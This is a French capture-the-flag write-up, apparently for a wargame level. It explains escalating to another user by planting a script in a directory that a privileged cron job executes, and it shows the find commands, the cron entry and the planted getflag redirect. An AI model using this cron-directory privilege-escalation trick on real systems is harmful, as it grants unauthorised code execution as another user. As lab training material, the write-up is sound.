On voit en se connectant le message:
    You have new mail.

en faisant la recherche:
    find / -user flag00 2>/dev/null

on trouve les fichier: 
    /usr/sbin/openarenaserver
    /rofs/usr/sbin/openarenaserver

qui contiennent le script:
    #!/bin/sh

    for i in /opt/openarenaserver/* ; do
	    (ulimit -t 5; bash -x "$i")
	    rm -f "$i"
    done

Avec la ligne de commande:
    find / -name level05 2> /dev/null
On finis par trouver le fichier:
    /var/mail/level05
qui contient la cron:
    */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05 qui tourne tout les 2 minute et execute le script plus haut

Il faut maintenant faire en sorte que ce script execute getflag.
on voit que le script execute tout les fichier dans le dosier /opt/openarenaserver/
il faut donc placer le fichier getflag dans ce fichier
tout fois il delete aussi tout les fichier de ce dossier il faut donc faire en sorte que l' ouput soit en dehors
pour 'ca on creer notre propre script:
    /bin/getflag > /tmp/flag2
qui va rediriger l' output dans /tmp/
il faut finalement attendre que la cron soit executer ~2 min.